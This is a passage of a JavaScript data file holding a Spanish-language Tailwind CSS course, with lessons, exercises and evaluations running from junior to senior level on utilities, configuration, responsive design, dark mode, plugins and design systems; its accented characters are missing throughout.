Tailwind CSS es un **framework de CSS basado en utilidades (utility-first)**. A diferencia de Bootstrap o Material UI, no te da componentes pre-diseados (como un botn azul), sino pequeas piezas de construccin (clases) para que t crees lo que quieras.

## 1. La Mentalidad "Utility-First"

En CSS tradicional, creas una clase y le pones estilos:
\`\`\`css
/* CSS Tradicional */
.btn-blue {
  background-color: #3b82f6;
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 0.25rem;
}
\`\`\`

En Tailwind, aplicas clases directamente en el HTML:
\`\`\`html
<!-- Tailwind CSS -->
<button class="bg-blue-500 text-white font-bold py-2 px-4 rounded">
  Botn
</button>
\`\`\`

## 2. Por qu usarlo?

1.  **Velocidad de desarrollo:** No tienes que saltar entre tu HTML y tu archivo CSS.
2.  **Mantenibilidad:** El archivo CSS no crece infinitamente. Tailwind solo genera el CSS que realmente usas.
3.  **Consistencia:** Usas un sistema predefinido de colores y espaciado (nada de \`padding: 13px;\` vs \`padding: 15px;\`).
4.  **No hay conflictos de nombres:** Ya no tienes que pensar si llamar a algo \`.wrapper-container\` o \`.container-main\`.

## 3. Comparacin Directa

**CSS Tradicional:** Tienes que inventar nombres de clases y preocuparte por la cascada.
**Tailwind:** Aplicas estilos atmicos. Si quieres cambiar el margen, cambias la clase en el elemento y listo.

---

## Mini Ejercicio
Si en CSS tradicional usas \`display: flex;\`, en Tailwind la clase es simplemente \`flex\`. 
Cmo crees que sera la clase para cambiar el texto a color rojo? (Pista: usa el formato \`text-{color}-{intensidad}\`).
`,completed:!1},{id:"tailwind-junior-instalacion",title:"Instalacin y Configuracin",level:"junior",content:`# Leccin 2: Instalacin y Configuracin

Existen varias formas de usar Tailwind, pero la recomendada para proyectos modernos es mediante **PostCSS** o su **CLI**.

## 1. Instalacin va npm

\`\`\`bash
npm install -D tailwindcss postcss autoprefixer
npx tailwindcss init
\`\`\`

Esto crear un archivo llamado \`tailwind.config.js\`.

## 2. Configuracin de Rutas (Content)

En \`tailwind.config.js\`, debes decirle a Tailwind dnde estn tus archivos para que pueda "purgar" el CSS que no usas.

\`\`\`javascript
/** @type {import('tailwindcss').Config} */
module.exports = {
  content: ["./src/**/*.{html,js,ts,jsx,tsx}"],
  theme: {
    extend: {},
  },
  plugins: [],
}
\`\`\`

## 3. Las Directivas de Tailwind

Debes agregar Tailwind a tu archivo CSS principal (ej: \`index.css\`):

\`\`\`css
@tailwind base;
@tailwind components;
@tailwind utilities;
\`\`\`

*   **Base:** Resetea los estilos del navegador (Preflight).
*   **Components:** Para tus propias clases reutilizables.
*   **Utilities:** El ncleo de Tailwind.

## 4. El CDN (Solo para pruebas)

Si solo quieres probar algo rpido sin instalar nada, puedes usar el CDN:
\`\`\`html
<script src="https://cdn.tailwindcss.com"><\/script>
\`\`\`
* No recomendado para produccin porque descarga todo el framework.*

---

## Mini Ejercicio
Si quieres cambiar la tipografa base de tu proyecto, en qu seccin del archivo \`tailwind.config.js\` crees que deberas agregar tu nueva fuente?
`,completed:!1},{id:"tailwind-junior-layout",title:"Clases de Layout",level:"junior",content:"# Leccin 3: Clases de Layout\n\nEl Layout es la estructura de tu pgina. Tailwind ofrece clases para manejar el ancho, la visibilidad, la posicin y ms.\n\n## 1. Contenedores y Ancho\n\n*   **`container`:** Crea un contenedor con un ancho mximo fijo basado en los breakpoints.\n*   **`w-{size}`:** Controla el `width`.\n    *   `w-full`: 100%.\n    *   `w-screen`: 100vw.\n    *   `w-1/2`: 50%.\n    *   `w-48`: 12rem (48 * 0.25rem).\n\n## 2. Altura (Height)\n\n*   **`h-{size}`:** Similar al ancho.\n    *   `h-screen`: 100vh.\n    *   `h-full`: 100%.\n\n## 3. Visualizacin (Display)\n\n*   `block`, `inline-block`, `inline`, `flex`, `grid`, `hidden` (display: none).\n\n## 4. Posicin\n\n*   `static`, `relative`, `absolute`, `fixed`, `sticky`.\n*   Para mover elementos posicionados: `top-0`, `left-10`, `inset-0` (todas las direcciones).\n\n## 5. El sistema de medida (0.25rem)\n\nEn Tailwind, casi todos los nmeros se multiplican por **4px (0.25rem)**.\n*   `w-4` = 16px.\n*   `w-1` = 4px.\n*   `w-10` = 40px.\n\n---\n\n## Mini Ejercicio\nSi quieres que un elemento ocupe exactamente la mitad del ancho de la pantalla y la mitad de la altura, qu clases usaras?\n",completed:!1},{id:"tailwind-junior-tipografia",title:"Tipografa",level:"junior",content:"# Leccin 4: Tipografa\n\nTailwind hace que manejar textos sea extremadamente sencillo y consistente.\n\n## 1. Tamao de Fuente (`text-{size}`)\n\n*   `text-xs`: 0.75rem\n*   `text-base`: 1rem (base)\n*   `text-xl`: 1.25rem\n*   `text-4xl`: 2.25rem\n*   `text-9xl`: 8rem\n\n## 2. Grosor de Fuente (`font-{weight}`)\n\n*   `font-light`: 300\n*   `font-normal`: 400\n*   `font-bold`: 700\n*   `font-black`: 900\n\n## 3. Alineacin y Decoracin\n\n*   Alineacin: `text-left`, `text-center`, `text-right`.\n*   Decoracin: `underline`, `italic`, `uppercase`, `lowercase`, `capitalize`.\n\n## 4. Familias de Fuente\n\nTailwind trae tres familias por defecto:\n*   `font-sans`: Letras redondas (Inter, system-sans).\n*   `font-serif`: Letras con remates (Georgia, Times New Roman).\n*   `font-mono`: Fuentes de cdigo.\n\n## 5. Espaciado de letras y lneas\n\n*   `leading-{size}`: Line-height (ej: `leading-tight`).\n*   `tracking-{size}`: Letter-spacing (ej: `tracking-widest`).\n\n---\n\n## Mini Ejercicio\nCrea una combinacin de clases para un ttulo que sea: Extra grande (5xl), Negrita (bold), todo en Maysculas (uppercase) y centrado.\n",completed:!1},{id:"tailwind-junior-colores",title:"Colores",level:"junior",content:'# Leccin 5: Colores\n\nUno de los puntos fuertes de Tailwind es su paleta de colores cuidadosamente curada.\n\n## 1. La Nomenclatura\n\nLos colores se componen de: `tipo-color-intensidad`\n*   `tipo`: `text`, `bg` (background), `border`, `outline`.\n*   `color`: `blue`, `red`, `slate`, `emerald`, `amber`, etc.\n*   `intensidad`: Un nmero del **50** al **950**.\n    *   `50`: Casi blanco.\n    *   `500`: Color puro.\n    *   `950`: Casi negro.\n\n## 2. Los Colores de la Marca (Predefinidos)\n\n*   `slate`, `gray`, `zinc`, `neutral`, `stone`: Diferentes tonos de grises.\n*   `red`, `orange`, `amber`, `yellow`: Clidos.\n*   `lime`, `green`, `emerald`, `teal`, `cyan`: Verdes y azules claros.\n*   `sky`, `blue`, `indigo`, `violet`, `purple`, `fuchsia`, `pink`, `rose`: Fros y vibrantes.\n\n## 3. Fondos y Opacidad\n\nPuedes aplicar opacidad al vuelo usando la barra literal `/`:\n```html\n<div class="bg-blue-500/50"> Fondo azul al 50% de opacidad </div>\n```\n\n## 4. Colores Especiales\n\n*   `white`: Blanco puro.\n*   `black`: Negro puro.\n*   `transparent`: Transparente.\n*   `current`: Toma el color del texto actual (til para iconos).\n\n---\n\n## Mini Ejercicio\nSi quieres crear un borde fino para una tarjeta, cul de estos colores crees que se vera ms profesional y sutil?\n1. `border-gray-500`\n2. `border-slate-200`\n3. `border-black`\n',completed:!1},{id:"tailwind-junior-espaciado",title:"Espaciado (Padding y Margin)",level:"junior",content:"# Leccin 6: Espaciado (Padding y Margin)\n\nEl espaciado es clave para que un diseo se sienta limpio. Tailwind usa la misma escala para padding, margin y gap.\n\n## 1. Padding (`p-{size}`)\n\nEs el espacio **interno** de un elemento.\n*   `p-4`: Padding en todos los lados (1rem).\n*   `px-4`: Padding izquierda y derecha (eje X).\n*   `py-4`: Padding arriba y abajo (eje Y).\n*   `pt-4`, `pr-4`, `pb-4`, `pl-4`: Lados especficos (top, right, bottom, left).\n\n## 2. Margin (`m-{size}`)\n\nEs el espacio **externo** de un elemento.\n*   Sigue la misma nomenclatura que el padding: `m-`, `mx-`, `my-`, `mt-`, `mr-`, `mb-`, `ml-`.\n*   **Margen Automtico:** `mx-auto` es la forma estndar de centrar un bloque con ancho fijo horizontalmente.\n\n## 3. Espacio entre elementos (`space-{dir}-{size}`)\n\nSi tienes una lista de elementos y quieres separarlos sin ponerle margen a cada uno:\n*   `space-x-4`: Separa elementos horizontalmente.\n*   `space-y-2`: Separa elementos verticalmente.\n\n## 4. Margen Negativo\n\nPuedes usar mrgenes negativos agregando un guion antes de la clase:\n*   `-mt-4`: Sube el elemento restando margen superior.\n\n---\n\n## Mini Ejercicio\nSi quieres que una tarjeta tenga mucho espacio interno a los lados pero poco espacio arriba y abajo, qu clases usaras combinando `px` y `py`?\n",completed:!1},{id:"tailwind-junior-flexbox",title:"Flexbox con Tailwind",level:"junior",content:`# Leccin 7: Flexbox con Tailwind

Flexbox es la herramienta ms usada para crear layouts unidimensionales. En Tailwind es extremadamente intuitivo.

## 1. Activando Flexbox

Se usa la clase \`flex\`. Por defecto, los elementos se ponen uno al lado del otro (\`flex-row\`).

## 2. Direccin

*   \`flex-row\`: Horizontal (por defecto).
*   \`flex-col\`: Vertical.
*   \`flex-row-reverse\` / \`flex-col-reverse\`: Invierte el orden.

## 3. Alineacin (Eje Principal)

*   \`justify-start\`: Al principio.
*   \`justify-center\`: Centrado.
*   \`justify-end\`: Al final.
*   \`justify-between\`: Espacio mximo entre elementos.

## 4. Alineacin (Eje Secundario)

*   \`items-start\`: Arriba.
*   \`items-center\`: Centrado verticalmente.
*   \`items-end\`: Abajo.
*   \`items-stretch\`: Estirar (por defecto).

## 5. Gap (Eje X e Y)

En lugar de usar \`space-x\`, modernamente usamos \`gap\`:
*   \`gap-4\`: Espacio uniforme entre todos los hijos.
*   \`gap-x-4\`: Solo horizontal.
*   \`gap-y-8\`: Solo vertical.

---

## Mini Ejercicio
Cmo centraras un icono dentro de un crculo div perfecto usando Flexbox y Tailwind? (Pista: necesitas centrar en ambos ejes).
`,completed:!1},{id:"tailwind-junior-grid",title:"Grid con Tailwind",level:"junior",content:`# Leccin 8: Grid con Tailwind

CSS Grid es ideal para layouts bidimensionales complejos (filas y columnas al mismo tiempo).

## 1. Activando el Grid

Se usa la clase \`grid\`.

## 2. Definiendo Columnas (\`grid-cols-{n}\`)

*   \`grid-cols-2\`: Crea 2 columnas iguales.
*   \`grid-cols-12\`: El estndar sistema de 12 columnas.
*   \`grid-cols-none\`: Desactiva las columnas explcitas.

## 3. Espaciado (Gap)

Igual que en Flexbox, usamos \`gap-{size}\` para separar las celdas.

## 4. Combinando Celdas (Col Span y Row Span)

A veces quieres que un elemento ocupe ms de una columna:
*   \`col-span-2\`: El elemento ocupa dos columnas.
*   \`col-span-full\`: El elemento ocupa todo el ancho disponible.
*   \`row-span-3\`: El elemento ocupa tres filas.

## 5. Control de Filas

*   \`grid-rows-{n}\`: Define el nmero de filas.
*   \`grid-flow-col\`: Hace que los elementos se posicionen en columnas automticamente en lugar de filas.

---

## Mini Ejercicio
Si tienes un contenedor con \`grid-cols-3\` y quieres que la cabecera arriba ocupe todo el ancho, qu clase de \`col-span\` le pondras a esa cabecera?
`,completed:!1},{id:"tailwind-junior-responsive",title:"Diseo Responsivo (Mobile First)",level:"junior",content:`# Leccin 9: Diseo Responsivo (Mobile First)

En Tailwind, no usas Media Queries en CSS. Usas **prefijos** en tus clases. La filosofa es **Mobile-First**: los estilos base son para el celular, y agregas prefijos para pantallas ms grandes.

## 1. Los Breakpoints por defecto

*   **Sin prefijo:** Celular (< 640px).
*   **\`sm:\`**: Tablet pequea (640px).
*   **\`md:\`**: Tablet / Laptop vieja (768px).
*   **\`lg:\`**: Laptop moderna (1024px).
*   **\`xl:\`**: Monitor Pro (1280px).
*   **\`2xl:\`**: Pantallas gigantes (1536px).

## 2. Cmo aplicarlo

\`\`\`html
<!-- Ancho completo en mvil, mitad en tablet, un tercio en laptop -->
<div class="w-full md:w-1/2 lg:w-1/3">
  Contenido
</div>
\`\`\`

## 3. Cambiando cualquier propiedad

Puedes aplicar breakpoints a **cualquier** clase:
*   \`text-center md:text-left\`: Centrado en mvil, a la izquierda en tablet.
*   \`hidden md:block\`: Oculto en mvil, visible en tablet.
*   \`bg-red-500 lg:bg-blue-500\`: Rojo en mvil, azul en pantallas grandes.

## 4. Error Comn: Pensar en rangos

En Tailwind, \`md:text-blue-500\` significa: "Aplica azul desde 768px **en adelante**". Si quieres que algo sea azul solo en tablet pero rojo en laptop, debes sobrescribirlo: \`md:bg-blue-500 lg:bg-red-500\`.

---

## Mini Ejercicio
Cmo haras para que un contenedor tenga 1 columna en mvil, 2 en tablet (\`md\`) y 4 en pantallas grandes (\`lg\`) usando Grid?
`,completed:!1},{id:"tailwind-junior-estados",title:"Hover, Focus y Otros Estados",level:"junior",content:`# Leccin 10: Hover, Focus y Otros Estados

Tailwind permite manejar estados interactivos con prefijos similares a los de responsive.

## 1. Hover (Pasar el ratn)

Se usa el prefijo \`hover:\`.
\`\`\`html
<button class="bg-blue-500 hover:bg-blue-700">
  Botn Interactivo
</button>
\`\`\`

## 2. Focus (Al seleccionar con teclado)

Ideal para inputs y accesibilidad. Se usa el prefijo \`focus:\`.
\`\`\`html
<input class="border-gray-300 focus:border-blue-500 focus:ring-2" />
\`\`\`

## 3. Active (Al hacer click)

Se usa el prefijo \`active:\`. til para dar feedback visual de presin.

## 4. Group Hover (Efectos combinados)

Si quieres que al pasar el mouse por un contenedor cambie un elemento hijo:
1.  Agregas \`group\` al padre.
2.  Agregas \`group-hover:clase\` al hijo.

\`\`\`html
<div class="group p-4 bg-white hover:bg-black">
  <p class="text-black group-hover:text-white">Este texto cambia con el padre</p>
</div>
\`\`\`

## 5. Peer States (Hermanos)

Permite cambiar un elemento basado en el estado de su hermano anterior (muy til para checkboxes o validacin de formularios) usando la clase \`peer\` y el prefijo \`peer-checked:\`, \`peer-focus:\`, etc.

---

## Mini Ejercicio
Crea un botn que sea de color azul claro (\`bg-blue-400\`), pero que al pasar el mouse sea azul oscuro (\`bg-blue-800\`) y que al hacer click se vuelva todava ms oscuro (\`bg-blue-950\`).
`,completed:!1},{id:"tailwind-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 11: Buenas Prcticas Bsicas

Escribir muchas clases en una sola lnea puede volverse catico. Aqu te enseamos cmo mantener tu proyecto profesional.

## 1. No abuses de \`@apply\`

Tailwind tiene una directiva llamada \`@apply\` que permite copiar clases al CSS tradicional.
*    **MAL:** Hacerlo para todo. Pierdes la ventaja de no tener que inventar nombres de clases.
*    **BIEN:** Solo para cosas extremadamente repetitivas, como un reset base para botones muy especficos.

## 2. Componentes al rescate

Si ests usando React, Vue o cualquier framework de componentes, **no copies y pegues clases**. Crea un componente.

\`\`\`tsx
//  BIEN: Lgica de reutilizacin en React
const Button = ({ children }) => (
  <button className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition-colors">
    {children}
  </button>
);
\`\`\`

## 3. Orden de Clases Consistente

Te recomendamos este orden mental:
1.  Layout (flex, grid, block)
2.  Posicin (relative, absolute)
3.  Tamao (w-10, h-10)
4.  Espaciado (p-4, m-2)
5.  Tipografa (text-lg, font-bold)
6.  Visual (bg-red, shadow, border)
7.  Interactividad (hover:, group:)
8.  Responsive (md:, lg:)

*Tip: Existe un plugin oficial de Prettier que ordena las clases por ti automticamente.*

## 4. Usa valores arbitrarios solo cuando sea necesario

Si necesitas una medida exacta que no est en la escala de Tailwind:
*   \`w-[13.5px]\` o \`bg-[#ff5500]\`.
Intenta evitarlos y usar los valores de la escala para mantener la armona visual.

---

## Proyecto Final Junior
Crea una **Tarjeta de Perfil Responsiva**:
1.  Un contenedor con sombra y bordes redondeados.
2.  Imagen de perfil circular a la izquierda (en desktop) o arriba (en mvil).
3.  Nombre en negrita y descripcin en gris.
4.  Un botn de "Seguir" que cambie de color al pasar el mouse.
5.  Usa Flexbox o Grid para alinear los elementos correctamente.

Felicidades! Ahora dominas las bases de Tailwind CSS. 
`,completed:!1},{id:"tailwind-junior-ejercicios",title:"Ejercicios Prcticos: Tailwind CSS Junior",level:"junior",content:`# Ejercicios Prcticos: Tailwind CSS Junior

Pon a prueba tu habilidad para maquetar interfaces modernas usando solo clases de utilidad. Recuerda: el objetivo es no escribir ni una sola lnea de CSS tradicional.

---

## 1. Tarjeta de Producto (E-commerce)
**Objetivo:** Dominar sombras, bordes, espaciado y tipografa.

**Consigna:**
Crea una tarjeta de producto que contenga:
*   Una imagen de producto en la parte superior.
*   Una etiqueta de "Nuevo" o "Oferta" flotando sobre la imagen (usa \`absolute\`).
*   Ttulo del producto en negrita.
*   Precio resaltado en un color llamativo (ej. \`text-indigo-600\`).
*   Un botn de "Aadir al carrito" que cambie de color al pasar el mouse (\`hover\`).
*   **Detalle:** La tarjeta debe tener una sombra suave (\`shadow-md\`) que aumente al pasar el mouse.

---

## 2. Navbar Minimalista y Responsiva
**Objetivo:** Practicar \`flexbox\`, alineacin y diseo responsivo (\`md:\`).

**Consigna:**
Disea una barra de navegacin que:
*   Tenga un logo a la izquierda y enlaces a la derecha.
*   En pantallas mviles, los enlaces deben estar ocultos (\`hidden\`) y mostrar un icono de men.
*   En pantallas medianas (\`md\`) y superiores, desaparece el icono de men y se muestran los enlaces.
*   La barra debe ser \`sticky\` (quedarse fija arriba al hacer scroll) y tener un fondo con desenfoque (\`backdrop-blur\`).

---

## 3. Seccin "Hero" de Landing Page
**Objetivo:** Combinar layout, tipografa gigante y botones de accin.

**Consigna:**
Crea la seccin principal de una web:
*   Un fondo con un degradado suave (\`bg-gradient-to-r\`).
*   Un ttulo principal gigante y centrado (\`text-5xl\` o superior).
*   Un subttulo que explique el producto.
*   Dos botones: uno principal (color slido) y uno secundario (solo borde/outline).
*   **Desafo:** Asegrate de que el texto no toque los bordes de la pantalla en mviles usando un padding lateral adecuado.

---

## 4. Formulario de Registro Estilizado
**Objetivo:** Manejar estados de \`focus\`, bordes y redondeados.

**Consigna:**
Disea un formulario que incluya:
*   Inputs con etiquetas (\`label\`) arriba.
*   Los inputs deben tener un borde sutil que se vuelva azul y brille al hacer click (\`focus:ring\`).
*   Un checkbox para "Acepto trminos y condiciones".
*   Un botn de "Crear cuenta" que ocupe todo el ancho (\`w-full\`).
*   **Detalle:** Agrega un icono pequeo dentro del input de email (puedes usar una imagen o un emoji).

---

## 5. Dashboard Sidebar (Ejercicios de Grid)
**Objetivo:** Crear una estructura de panel de control.

**Consigna:**
Crea un layout de dashboard que use \`grid\`:
*   Una barra lateral fime (sidebar) con iconos y texto.
*   Un rea de contenido principal a la derecha.
*   **Desafo:** En mviles, la sidebar debe desaparecer y mostrarse solo el contenido, o moverse a la parte inferior.
*   Dentro del contenido, crea 3 tarjetas pequeas con "Estadsticas" (ej. "Usuarios Totales: 1,200") alineadas usando Flexbox.

---

A maquetar! Tailwind es como jugar con Legos: una vez que conoces las piezas, puedes construir cualquier cosa. 
`,completed:!1,isProject:!0},{id:"tailwind-junior-evaluacion",title:"Evaluacin Tailwind CSS Junior",level:"junior",content:'# Evaluacin Final: Tailwind CSS Junior\n\nDemuestra que dominas la mentalidad utility-first y el maquetado responsivo bsico.\n\n## 1. Examen Terico\n*   Cul es la diferencia entre `p-4` y `m-4`?\n*   Qu significa que Tailwind sea "Mobile-First"?\n*   Para qu sirve el archivo `tailwind.config.js`?\n\n## 2. Desafo Prctico: Perfil de Usuario\nCrea un componente `UserCard` que:\n1. Tenga una imagen circular centrada.\n2. Un ttulo con fuente negrita y tamao `text-xl`.\n3. Use un color de fondo sutil (ej: `bg-slate-50`).\n4. Sea responsivo: texto centrado en mviles y alineado a la izquierda en tablets (`md`).\n\n## 3. Criterios de Aprobacin\n* [ ] Uso exclusivo de utilidades de Tailwind (sin CSS externo).\n* [ ] Implementacin exitosa de al menos un breakpoint (`sm`, `md` o `lg`).\n* [ ] Diseo visualmente limpio y equilibrado.\n',completed:!1,isProject:!0},{id:"tailwind-semi-senior-configuracion-avanzada",title:"Configuracin Avanzada y Design Tokens",level:"semi-senior",content:`# Leccin 12: Configuracin Avanzada y Design Tokens

A nivel Semi-Senior, dejas de usar los valores por defecto de Tailwind para implementar el **Sistema de Diseo (Design System)** de tu marca o cliente.

## 1. El Objeto \`theme\`
En \`tailwind.config.js\`, la seccin \`theme\` es donde defines la "verdad nica" de tu diseo.

*   \`theme\`: **Sobrescribe** los valores por defecto de Tailwind.
*   \`theme.extend\`: **Agrega** o modifica valores sin perder los de fbrica.

\`\`\`javascript
// tailwind.config.js
module.exports = {
  theme: {
    extend: {
      colors: {
        brand: {
          light: '#3fbaeb',
          DEFAULT: '#0fa9e6',
          dark: '#0c87b8',
        },
      },
      spacing: {
        '128': '32rem',
      }
    }
  }
}
\`\`\`

## 2. Design Tokens
Un Design Token es una variable que representa una decisin de diseo (color, fuente, espaciado). 
**Pro tip:** No nombres tus colores por lo que son (\`blue-500\`), nmbralos por su funcin (\`primary\`, \`secondary\`, \`success\`).

\`\`\`javascript
colors: {
  primary: 'var(--color-primary)', // Usando variables CSS para mayor flexibilidad
  surface: '#ffffff',
}
\`\`\`

## 3. Pantallas Personalizadas
A veces el \`md\` de 768px no encaja con tu diseo. Puedes definir tus propios breakpoints.

\`\`\`javascript
screens: {
  'tablet': '640px',
  'laptop': '1024px',
  'ultra': '1920px',
}
\`\`\`

---

## Mini Ejercicio
Modifica tu configuracin para agregar un color llamado \`accent\` con intensidad \`500\` y salo en un botn.
`,completed:!1},{id:"tailwind-semi-senior-componentizacion",title:"Componentizacin y Manejo de Clases Dinmicas",level:"semi-senior",content:`# Leccin 13: Componentizacin y Manejo de Clases Dinmicas

El mayor problema de Tailwind es el "Class Soup" (sopa de clases). Para solucionarlo, usamos patrones de componentizacin profesional.

## 1. El Problema de la Concatenacin
\`\`\`javascript
//  INCORRECTO: Difcil de leer y propenso a errores
const className = "px-4 py-2 " + (isActive ? "bg-blue-500" : "bg-gray-200");
\`\`\`

## 2. Herramientas Imprescindibles: \`clsx\` y \`tailwind-merge\`
Al trabajar en React, necesitas estas dos libreras:
*   **\`clsx\` / \`classnames\`**: Permite escribir lgica condicional limpia.
*   **\`tailwind-merge\`**: Resuelve conflictos de clases (ejm: si pasas \`p-4\` y \`p-2\`, gana la ltima).

\`\`\`javascript
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';

export function cn(...inputs) {
  return twMerge(clsx(inputs));
}

// Uso: <div className={cn("base-class", isActive && "active-class", className)} />
\`\`\`

## 3. Class Variance Authority (CVA)
El patrn estndar de la industria hoy para crear componentes con variantes (como botones que pueden ser "primary", "outline", "danger").

\`\`\`javascript
const buttonVariants = cva(
  "inline-flex items-center rounded-md font-medium px-4 py-2",
  {
    variants: {
      intent: {
        primary: "bg-blue-600 text-white hover:bg-blue-700",
        outline: "border border-gray-300 text-gray-700 hover:bg-gray-50",
      },
      size: {
        sm: "text-xs px-2",
        md: "text-sm px-4",
      }
    },
    defaultVariants: {
      intent: "primary",
      size: "md",
    }
  }
);
\`\`\`

---

## Mini Ejercicio
Crea un componente \`Badge\` en React que use el patrn \`cn()\` para cambiar su color de fondo basndose en una prop \`type\` ("success" o "error").
`,completed:!1},{id:"tailwind-semi-senior-dark-mode-responsive",title:"Dark Mode y Estrategias Responsivas",level:"semi-senior",content:`# Leccin 14: Dark Mode y Estrategias Responsivas

Implementar un modo oscuro profesional requiere ms que solo invertir colores.

## 1. Activando Dark Mode
Existen dos formas en Tailwind:
1.  **Media (default)**: Basado en las preferencias del sistema operativo.
2.  **Class**: Basado en una clase calculada (ej. \`<html class="dark">\`). Es la ms comn para permitir que el usuario elija con un toggle.

\`\`\`javascript
// tailwind.config.js
module.exports = {
  darkMode: 'class',
  // ...
}
\`\`\`

## 2. Aplicando Estilos
Usas el prefijo \`dark:\`.
\`\`\`html
<div class="bg-white text-black dark:bg-slate-900 dark:text-white">
  Contenido adaptable
</div>
\`\`\`

## 3. Contenedores Responsivos Avanzados
A veces quieres que un elemento mantenga su relacin de aspecto.
*   \`aspect-video\`: 16/9
*   \`aspect-square\`: 1/1
*   \`aspect-[4/3]\`: Personalizado

## 4. El "Container Queries" (El futuro)
A menudo no quieres que un componente cambie segn el ancho de la **pantalla**, sino segn el ancho de su **padre**. Tailwind ofrece un plugin oficial para esto: \`@tailwindcss/container-queries\`.

\`\`\`html
<div class="@container">
  <div class="@lg:grid-cols-3 grid grid-cols-1">
    <!-- Cambia a 3 cols cuando el CONTENEDOR es grande, no la pantalla -->
  </div>
</div>
\`\`\`

---

## Mini Ejercicio
Disea una tarjeta que en modo claro tenga un fondo gris muy suave (\`slate-50\`) y en modo oscuro sea un color gris profundo (\`slate-800\`), cambiando tambin el color del texto.
`,completed:!1},{id:"tailwind-semi-senior-plugins-estados",title:"Plugins y Estados de Interaccin Avanzados",level:"semi-senior",content:`# Leccin 15: Plugins y Estados de Interaccin Avanzados

Tailwind es poderoso, pero a veces necesitas ir ms all de las utilidades estndar.

## 1. Plugins Oficiales que DEBES conocer
Tailwind ofrece plugins para resolver problemas comunes sin ensuciar tu CSS:
1.  **Typography (\`@tailwindcss/typography\`)**: Agrega la clase \`prose\`, ideal para estilizar HTML que viene de un CMS o Markdown.
2.  **Forms (\`@tailwindcss/forms\`)**: Resetea los estilos de los inputs para que sean fciles de personalizar.
3.  **Aspect Ratio**: Si no usas la versin ms nueva de CSS.
4.  **Line Clamp**: Para truncar textos a N lneas.

## 2. Creando tus propios Plugins
Puedes agregar tus propias utilidades o "base styles" directamente en la config.

\`\`\`javascript
const plugin = require('tailwindcss/plugin')

module.exports = {
  plugins: [
    plugin(function({ addUtilities }) {
      addUtilities({
        '.text-shadow': {
          textShadow: '2px 2px 4px rgba(0,0,0,0.1)',
        },
      })
    })
  ]
}
\`\`\`

## 3. Estados Complejos y Pseudo-clases
*   **\`autofill:\`**: Estilos cuando el navegador autocompleta un campo.
*   **\`file:\`**: Estilos para el botn de "Elegir archivo" en un input file.
*   **\`marker:\`**: Estilos para los puntos o nmeros de una lista \`<ul>\` o \`<ol>\`.
*   **\`selection:\`**: Color de fondo cuando seleccionas texto con el mouse.

## 4. Estilos basados en Atributos
Puedes usar \`data-attributes\` para cambiar estilos desde JavaScript sin cambiar clases.
\`\`\`html
<div data-active="true" class="data-[active=true]:bg-green-500"> ... </div>
\`\`\`

---

## Proyecto Semi-Senior Final
Crea una **Navbar con Dropdown** que:
1.  Use \`dark mode\`.
2.  Tenga un men desplegable que aparezca con una animacin suave usando \`group-hover\`.
3.  Est construida con el patrn de componentes (usando \`cn\` o \`clsx\`).
4.  Implemente configuraciones personalizadas en el \`tailwind.config\`.

Excelente trabajo! Ests a un paso de la maestra total. 
`,completed:!1},{id:"tailwind-semi-senior-evaluacion",title:"Evaluacin Tailwind CSS Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: Tailwind CSS Semi-Senior

Enfocada en mantenibilidad, componentizacin y personalizacin del sistema.

## 1. Examen Terico
*   Por qu es una mala prctica abusar de la directiva \`@apply\`?
*   Cmo resolveras un conflicto de clases ("class collision") en React?
*   Explica cmo funciona la estrategia de \`class\` para el Dark Mode.

## 2. Desafo Prctico: Sistema de Variantes
Crea un componente \`Button\` que acepte una prop \`variant\` ("primary", "secondary", "danger").
1. Cada variante debe tener sus propios colores de fondo y hover.
2. Usa la funcin \`cn\` (clsx + tailwind-merge) para combinar las clases.
3. El botn debe ser compatible con Dark Mode.

## 3. Criterios de Aprobacin
* [ ] Cdigo organizado y sin repeticin innecesaria de clases ("DRY").
* [ ] Correcta implementacin de lgica condicional para estilos.
* [ ] Uso de configuracin personalizada en el \`theme\`.
`,completed:!1,isProject:!0},{id:"tailwind-senior-senior-design-systems",title:"Tailwind en Sistemas de Diseo a Gran Escala",level:"senior",content:`# Leccin 16: Tailwind en Sistemas de Diseo a Gran Escala

A nivel Senior, Tailwind no es solo una herramienta de estilado, es el motor de tu **Design System**. En aplicaciones con cientos de componentes, la consistencia y la escalabilidad son crticas.

## 1. Abstraccin del Token
Un error Senior comn es exponer las clases de Tailwind directamente en componentes de negocio.
*    **Mal**: \`<div className="bg-blue-500 p-4">\` en un componente de \`Facturacin\`.
*    **Bien**: Crear componentes base atmicos (Atom) que encapsulan Tailwind y exponer solo propiedades lgicas.

## 2. Configuracin Compartida (Preset)
Si manejas mltiples repositorios (ej. una Web, un Dashboard y una App mvil con React Native), no repites la configuracin. Usas un **Preset**.

\`\`\`javascript
// company-preset.js
module.exports = {
  theme: {
    extend: {
      colors: {
        brand: '#ff5a5f',
      },
    },
  },
  plugins: [require('@tailwindcss/typography')],
}

// tailwind.config.js de cada proyecto
module.exports = {
  presets: [require('./company-preset.js')],
  // ... configuracin especfica local
}
\`\`\`

## 3. Performance y Bundle Size
Tailwind es rpido porque genera CSS esttico, pero si usas demasiadas variantes o colores arbitrarios (\`-[...]\`), el archivo generado puede crecer.
*   **JIT (Just-In-Time)**: Entender cmo el motor busca clases en tiempo real.
*   **Safe-listing**: Evita purgar clases que se generan dinmicamente desde una DB.

## 4. Estrategias de Migracin
Cmo migrar un monolito de 10 aos con 50,000 lneas de CSS a Tailwind?
*   **Estrategia de Convivencia**: Usar un \`prefix\` en Tailwind (ej: \`tw-\`) para evitar colisiones con el CSS viejo durante la transicin.
*   **Estrategia de Reemplazo por Capas**: Empezar por el layout y tipografa, dejando los componentes complejos para el final.

---

## Pregunta de Entrevista Senior
**P:** "Cmo manejaras el conflicto de clases cuando un usuario consume tu librera de componentes y quiere sobrescribir un estilo?"
**R:** Implementara un patrn de \`merge\` usando \`tailwind-merge\` dentro de los componentes base para asegurar que las props del usuario tengan prioridad sobre los estilos por defecto sin duplicar utilidades.
`,completed:!1},{id:"tailwind-senior-evaluacion",title:"Evaluacin Tailwind CSS Senior",level:"senior",content:`# Evaluacin Final: Tailwind CSS Senior

Orientada a la arquitectura, performance y liderazgo tcnico.

## 1. Diseo de Arquitectura
